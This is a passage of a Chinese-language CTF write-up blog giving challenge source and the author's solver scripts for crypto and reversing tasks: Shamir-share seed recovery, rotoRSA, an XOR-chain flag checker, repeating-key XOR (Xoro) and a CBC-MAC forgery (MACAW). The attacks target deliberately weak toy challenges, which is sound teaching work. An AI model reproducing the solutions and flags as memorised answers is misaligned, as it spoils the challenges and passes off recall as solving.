class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i: poly[i] * <span class="built_in">pow</span>(x, i), <span class="built_in">range</span>(<span class="built_in">len</span>(poly)))))</span><br></pre></td></tr></table></figure>

<p>异或，加密函数就是解密函数；需要知道<code>random.getrandbits(len(flag)*8)</code>，也就是需要知道随机种子<code>poly[0]</code></p>
<p>给的<code>SHARES</code>比较小，所以应该不是梅森旋转随机数的复原；已知</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i: poly[i] * <span class="built_in">pow</span>(x, i), <span class="built_in">range</span>(<span class="built_in">len</span>(poly))))</span><br></pre></td></tr></table></figure>

<p>即<br>$$<br>\sum_{i=0}^{29}poly{[i]}\times x^i<br>$$<br>x为我们的输入，显然当x=1，输出的就是poly的和<br>$$<br>poly[0]+poly[1]+poly[2]+poly[3]+…+poly[29]<br>$$<br>如果我们知道<br>$$<br>poly[0]+poly[1]\times 2+poly[2]\times 2^2+poly[3]\times 2^3+…+poly[29]\times 2^{29}<br>$$<br>等一系列的，估计可以搞点事情；可惜同一组poly只能求到关于一个x的多项式</p>
<p>找了许久才在la佬博客里找到关于Shamir的攻击，其他的基本上都是一些实现过程</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810095550916.png" alt="image-20210810095550916"></p>
<p>设poly[0]为$s_1$，poly[0]+2为$s_2$，$poly[1]+poly[2]+poly[3]+…+poly[29]$为A，p我们整一个256位的素数<br>$$<br>s_1+A-f(x)_1\equiv 0\ (mod\ p)<br>$$<br>$$<br>s_2+A-f(x)_2\equiv 0\ (mod\ p)<br>$$<br>$$<br>s_1+2-s_2\equiv 0\ (mod\ p)<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y1 = <span class="number">4597744014826739716773723494617979066503</span></span><br><span class="line">y2 = y1 + <span class="number">2</span></span><br><span class="line">PR.&lt;s1,s2,A&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f1 = s1 + A - y1</span><br><span class="line">f2 = s2 + A - y2</span><br><span class="line">f3 = a * s1 + b - s2</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s1 =&#x27;</span>, ZZ(-B[<span class="number">0</span>](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s2 =&#x27;</span>, ZZ(-B[<span class="number">1</span>](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)))</span><br></pre></td></tr></table></figure>

<p>emmmmm果然偷鸡取巧不是正道，只有一个方程，再怎么变也不可能变成方程组</p>
<p>最后尚师傅提示我了，呜呜呜，尚师傅超神了</p>
<p>不是要知道第一位吗，不妨我们给的x是100000000000000000000000000000000000000000000，差不多凑到128位多点，这样就会得到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810101824190.png" alt="image-20210810101824190"></p>
<p>没错，poly的每一个值都暴露在眼前</p>
<p>这里的题目不会是Shamir的0day吧，kiddingXD</p>
<p>剩下的写个小脚本，设置下随机数就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">ba1, ba2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(ba1, ba2)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;6068879a5da40b08757b59a3924302244a52c2162505e531ccd061739e03d2&#x27;</span></span><br><span class="line"></span><br><span class="line">ploy0 =  <span class="number">324624027062034109200467879481074306259</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">1000</span>):</span><br><span class="line">    random.seed(ploy0)</span><br><span class="line">    <span class="built_in">print</span>(bxor(long_to_bytes(<span class="built_in">int</span>(cipher, <span class="number">16</span>)), long_to_bytes(random.getrandbits(k * <span class="number">8</span>))))</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-rotoRSA-unsolved"><a href="#Crypto-rotoRSA-unsolved" class="headerlink" title="Crypto-rotoRSA(unsolved)"></a>Crypto-rotoRSA(unsolved)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> poly, symbols</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> Crypto.Random.random <span class="keyword">as</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_poly</span>(<span class="params">coeffs</span>):</span></span><br><span class="line">    x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> poly(<span class="built_in">sum</span>(coeff * x ** i <span class="keyword">for</span> i, coeff <span class="keyword">in</span> <span class="built_in">enumerate</span>(coeffs)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_msg</span>(<span class="params">msg, poly, e, N</span>):</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(poly(msg), e, N)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">coeffs = deque([random.randint(<span class="number">0</span>, <span class="number">128</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">welcome_message = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Welcome to RotorSA!</span></span><br><span class="line"><span class="string">With our state of the art encryption system, you have two options:</span></span><br><span class="line"><span class="string">1. Encrypt a message</span></span><br><span class="line"><span class="string">2. Get the encrypted flag</span></span><br><span class="line"><span class="string">The current public key is</span></span><br><span class="line"><span class="string">n = <span class="subst">&#123;N&#125;</span></span></span><br><span class="line"><span class="string">e = <span class="subst">&#123;e&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(welcome_message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    padding = build_poly(coeffs)</span><br><span class="line">    choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;What is your choice? &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        message = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;What is your message? &#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        encrypted = encrypt_msg(message, padding, e, N)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;The encrypted message is <span class="subst">&#123;encrypted&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">        encrypted_flag = encrypt_msg(flag, padding, e, N)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;The encrypted flag is <span class="subst">&#123;encrypted_flag&#125;</span>&#x27;</span>)</span><br><span class="line">    coeffs.rotate(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/rotorsa.jpg" alt="rotorsa"></p>
<p>ECC有点吃力了，没有做下去</p>
<h3 id="Re-verybabyrev"><a href="#Re-verybabyrev" class="headerlink" title="Re-verybabyrev"></a>Re-verybabyrev</h3><p>checksec一下，发现是小端序，这点很重要，后面我在s1的每一个地方都逆序了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210807205724502.png" alt="image-20210807205724502"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 s1[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">140</span>]; <span class="comment">// [rsp+70h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  s1[<span class="number">0</span>] = <span class="string">&#x27;EH\x1D\x12\x17\x11\x13\x13&#x27;</span>;</span><br><span class="line">  s1[<span class="number">1</span>] = <span class="string">&#x27;\t_B,&amp;\vAE&#x27;</span>;</span><br><span class="line">  s1[<span class="number">2</span>] = <span class="string">&#x27;T\x1BVV=l_\v&#x27;</span>;</span><br><span class="line">  s1[<span class="number">3</span>] = <span class="string">&#x27;X\\\v&lt;)EA_&#x27;</span>;</span><br><span class="line">  s1[<span class="number">4</span>] = <span class="string">&#x27;@*lT\t]_\0&#x27;</span>;</span><br><span class="line">  s1[<span class="number">5</span>] = <span class="string">&#x27;K_BH\&#x27;</span>j\x06\x06<span class="number">&#x27;</span>;</span><br><span class="line">  s1[<span class="number">6</span>] = <span class="string">&#x27;l^]C,-BV&#x27;</span>;</span><br><span class="line">  s1[<span class="number">7</span>] = <span class="string">&#x27;k1^CG\aA-&#x27;</span>;</span><br><span class="line">  s1[<span class="number">8</span>] = <span class="string">&#x27;^TI\x1Cn;\nZ&#x27;</span>;</span><br><span class="line">  s1[<span class="number">9</span>] = <span class="string">&#x27;((G^\x054+\x1A&#x27;</span>;</span><br><span class="line">  s1[<span class="number">10</span>] = <span class="string">&#x27;\x06\x04P\a;&amp;\x11\x1F&#x27;</span>;</span><br><span class="line">  s1[<span class="number">11</span>] = <span class="string">&#x27;\nwH\x03\x05\v\r\x04&#x27;</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your flag: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( s[<span class="number">0</span>] != <span class="number">114</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt;= <span class="number">126</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[i] ^= s[i + <span class="number">1</span>];</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(s1, s, <span class="number">97uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后也很像有一个初始状态的流密码，依次异或回去就好了</p>
<p>kw，scr1pt师傅竟然说我的代码写得丑，气得我抢了他的flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">s1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">s1 += <span class="string">b&#x27;EH\x1D\x12\x17\x11\x13\x13&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;\t_B,&amp;\vAE&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;T\x1BVV=l_\v&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;X\\\v&lt;)EA_&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;@*lT\t]_\0&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;K_BH\&#x27;j\x06\x06&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;l^]C,-BV&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;k1^CG\aA-&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;^TI\x1Cn;\nZ&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;((G^\x054+\x1A&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;\x06\x04P\a;&amp;\x11\x1F&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;\nwH\x03\x05\v\r\x04&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 = s1.decode()</span><br><span class="line">flag = <span class="string">&#x27;r&#x27;</span></span><br><span class="line">t = <span class="built_in">chr</span>(<span class="built_in">ord</span>(s1[<span class="number">0</span>]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;r&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1[<span class="number">1</span>:]:</span><br><span class="line">    flag += t</span><br><span class="line">    t = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(t))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不过话说回来，re虽然逆算法，但是还有一些脱壳等的操作，暂时不能很快上手，看了第二题就放弃看了</p>
<h2 id="Bsides-Noida-CTF"><a href="#Bsides-Noida-CTF" class="headerlink" title="Bsides Noida CTF"></a>Bsides Noida CTF</h2><h3 id="Crypto-Xoro-recuring"><a href="#Crypto-Xoro-recuring" class="headerlink" title="Crypto-Xoro(recuring)"></a>Crypto-Xoro(recuring)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(a,b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">text, size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> text*(size//<span class="built_in">len</span>(text)) + text[:size%<span class="built_in">len</span>(text)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    keystream = pad(key, <span class="built_in">len</span>(data))</span><br><span class="line">    encrypted = xor(keystream, data)</span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n===== WELCOME TO OUR ENCRYPTION SERVICE =====\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = os.urandom(<span class="number">32</span>)</span><br><span class="line">        pt = <span class="built_in">input</span>(<span class="string">&#x27;[plaintext (hex)]&gt;  &#x27;</span>).strip()</span><br><span class="line">        ct = encrypt(<span class="built_in">bytes</span>.fromhex(pt) + FLAG, key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ciphertext (hex)]&gt;&quot;</span>, ct)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;See ya ;)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;:( Oops!&quot;</span>, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Terminating Session!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>不会，一个pad给我整蒙了，看了CTFTIME上的WP，自己读代码还是太菜了</p>
<p>pad不深究，就是将key填充至和pt+flag一样的长度，那么这样想就很简单了吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/Xoro.png" alt="Xoro"></p>
<p>根据cipher以及我们自己定的pt是完全可以得到key的</p>
<p>就是要知道<strong>一个字节相当于两个字符</strong>，所以要知道key，pt的长度起码是有64个字符长</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810161354309.png" alt="image-20210810161354309"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">text, size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> text*(size//<span class="built_in">len</span>(text)) + text[:size % <span class="built_in">len</span>(text)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    keystream = pad(key, <span class="built_in">len</span>(data))</span><br><span class="line">    encrypted = xor(keystream, data)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line">pt = <span class="string">&#x27;4&#x27;</span>*<span class="number">64</span></span><br><span class="line">cipher = <span class="string">&#x27;b4547524f42baec143f1d9cb57e3d35eff4b7f3e13f551a2cb0eb73600d6ac1bb2437f0fd90b8bfe6fdaead070c6f945c2604e2535c37087e415a73a01cdb010a24f0e418f4e97&#x27;</span></span><br><span class="line">key = xor(<span class="built_in">bytes</span>.fromhex(pt), <span class="built_in">bytes</span>.fromhex(cipher)[:<span class="number">32</span>])</span><br><span class="line"><span class="built_in">print</span>(encrypt(<span class="built_in">bytes</span>.fromhex(cipher), key))</span><br></pre></td></tr></table></figure>

<p>竟然卡在pad上，做密码学的题目还是太少</p>
<h3 id="Crypto-MACAW"><a href="#Crypto-MACAW" class="headerlink" title="Crypto-MACAW"></a>Crypto-MACAW</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> topsecrets <span class="keyword">import</span> iv, key, secret_msg, secret_tag, FLAG</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/===== MENU =====\\</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">|  [M] MAC Gen   |</span></span><br><span class="line"><span class="string">|  [A] AUTH      |</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">\================/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MAC</span>(<span class="params">data</span>):</span>    </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) % <span class="number">16</span> == <span class="number">0</span>, <span class="string">&quot;Invalid Input&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> data != secret_msg, <span class="string">&quot;Not Allowed!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    tag = cipher.encrypt(data)[-<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> tag.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AUTH</span>(<span class="params">tag</span>):</span></span><br><span class="line">    <span class="keyword">if</span> tag == secret_tag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Successfully Verified!\n[-] Details:&quot;</span>, FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Verification Flaied !!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(secret_msg)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="built_in">print</span>(menu)</span><br><span class="line">            ch = <span class="built_in">input</span>(<span class="string">&quot;[?] Choice: &quot;</span>).strip().upper()</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">                data = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter plaintext(hex): &quot;</span>).strip()</span><br><span class="line">                tag = MAC(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Generated tag:&quot;</span>, tag)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] iv:&quot;</span>, iv.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">elif</span> ch == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                tag = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter your tag to verify: &quot;</span>).strip()</span><br><span class="line">                AUTH(tag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] Invalid Choice&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;:( Oops!&quot;</span>, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Terminating Session!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Why are MACAWS becoming Another Endangered Species?</span><br></pre></td></tr></table></figure>

<p>AES，CBC；拿出DAS签到的图                                           </p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810163522657.png" alt="image-20210810163522657"/>

<p>嗯？这种题目，50Solves？</p>
<p>只要<code>data == secret_msg</code>就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> data != secret_msg, <span class="string">&quot;Not Allowed!!!&quot;</span></span><br></pre></td></tr></table></figure>

<p>那么显然看主函数的第一段，secret_msg就是<code>Welcome to BSidesNoida!! Follow us on Twitter...</code>，然后转一下十六进制编码；不是很懂代码的逻辑，但是将得到的tag发过去就得到flag了<code>BSNoida&#123;M4c4w5_4r3_4d0r4b13&#125;</code></p>
<p>a few moments later</p>
<p>我收回我刚才的话，上面的分析是不对的，不是只要<code>data == secret_msg</code>就好了，而是要<code>data != secret_msg</code>，但真正的secret_msg还有一个<code>/n</code>，而且如果加上<code>\n</code>又不满足第一个条件</p>
<p>所以综上，不知道是出题人有意为之，还是无心插柳，被我瞎jb搞出来了，也可以称得上是签到题吧（为了证明我搞出来我flag破例给出了;)）</p>
<h3 id="Crypto-Macaw-Revenge"><a href="#Crypto-Macaw-Revenge" class="headerlink" title="Crypto-Macaw_Revenge"></a>Crypto-Macaw_Revenge</h3><p>好吧，原来是为这道题做铺垫</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/===== MENU =====\\</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">|  [M] MAC Gen   |</span></span><br><span class="line"><span class="string">|  [A] AUTH      |</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">\================/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MAC</span>(<span class="params">data, check=<span class="literal">False</span></span>):</span>    </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) % <span class="number">16</span> == <span class="number">0</span>, <span class="string">&quot;Invalid Input&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check:</span><br><span class="line">        <span class="keyword">assert</span> data != secret_msg, <span class="string">&quot;Not Allowed!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    tag = cipher.encrypt(data)[-<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> tag.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AUTH</span>(<span class="params">tag</span>):</span></span><br><span class="line">    <span class="keyword">if</span> tag == secret_tag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Successfully Verified!\n[-] Details:&quot;</span>, FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Verification Flaied !!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>)</span><br><span class="line">    secret_msg = os.urandom(<span class="number">48</span>)</span><br><span class="line">    secret_tag = MAC(secret_msg)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Forbidden msg: <span class="subst">&#123;secret_msg.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="built_in">print</span>(menu)</span><br><span class="line">            ch = <span class="built_in">input</span>(<span class="string">&quot;[?] Choice: &quot;</span>).strip().upper()</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">                data = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter plaintext(hex): &quot;</span>).strip()</span><br><span class="line">                tag = MAC(<span class="built_in">bytes</span>.fromhex(data), check=<span class="literal">True</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Generated tag:&quot;</span>, tag)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] iv:&quot;</span>, iv.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">elif</span> ch == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                tag = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter your tag to verify: &quot;</span>).strip()</span><br><span class="line">      